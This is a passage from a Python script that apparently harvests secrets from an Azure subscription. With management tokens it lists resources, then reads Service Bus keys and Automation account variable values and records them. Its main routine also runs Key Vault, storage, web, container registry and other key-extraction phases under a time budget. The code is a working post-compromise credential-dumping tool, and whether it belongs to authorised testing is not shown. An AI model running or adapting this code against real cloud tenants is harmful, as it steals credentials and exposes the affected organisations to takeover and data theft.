                    for k, v in bk.items():
                        if isinstance(v, str) and len(v) >= 8:
                            record_value("sb-key", f"{rtype}/{name}/{rule}/{k}", v,
                                         {"resource": name, "rule": rule, "field": k})
                else:
                    emit({"step": "G-sb-key-err", "name": name, "rule": rule, "http": stk,
                          **brief(stk, bk)})
    # Automation account variables (values may be readable individually)
    for x in resources:
        if (x.get("type") or "").lower() != "microsoft.automation/automationaccounts":
            continue
        if left() < 210:
            return
        name = x.get("name")
        rgq = urllib.parse.quote((x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0])
        stv, bv = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                           f"Microsoft.Automation/automationAccounts/{name}/variables"
                           "?api-version=2023-11-01")
        names = [v.get("name") for v in ((bv.get("value") or []) if isinstance(bv, dict) else [])]
        emit({"step": "G-automation-vars", "account": name, "http": stv,
              "n": len(names), "names": names[:40]})
        for vn in names[:25]:
            if left() < 200:
                return
            st1, b1 = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                               f"Microsoft.Automation/automationAccounts/{name}/variables/{vn}"
                               "?api-version=2023-11-01")
            if st1 == 200 and isinstance(b1, dict):
                val = (b1.get("properties") or {}).get("value")
                if val:
                    record_value("automation-variable", f"{name}/{vn}", val,
                                 {"account": name, "variable": vn})
            else:
                emit({"step": "G-automation-var-get", "account": name, "var": vn, "http": st1,
                      **brief(st1, b1)})


def main():
    emit({"step": "START", "intent": 121439, "sub": SID, "rg": RG,
          "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})
    tok, kv_tok, stg_tok = get_tokens()
    if not tok:
        emit({"step": "FATAL", "why": "no-arm-token"})
        return
    for fn in (phase_identity, phase_inventory):
        try:
            fn(tok)
        except Exception as e:  # noqa: BLE001
            emit({"step": "phase-error", "fn": fn.__name__, "err": str(e)[:400]})
    for fn in (phase_keyvault, phase_storage, phase_web, phase_acr, phase_other_keys):
        if left() < 120:
            emit({"step": "SKIP", "fn": fn.__name__, "left": int(left())})
            continue
        try:
            if fn is phase_keyvault:
                fn(tok, kv_tok)
            else:
                fn(tok)
        except Exception as e:  # noqa: BLE001
            emit({"step": "phase-error", "fn": fn.__name__, "err": str(e)[:400]})
    emit({"step": "DONE", "elapsed_s": int(time.time() - T0), "left": int(left())})


if __name__ == "__main__":
    main()
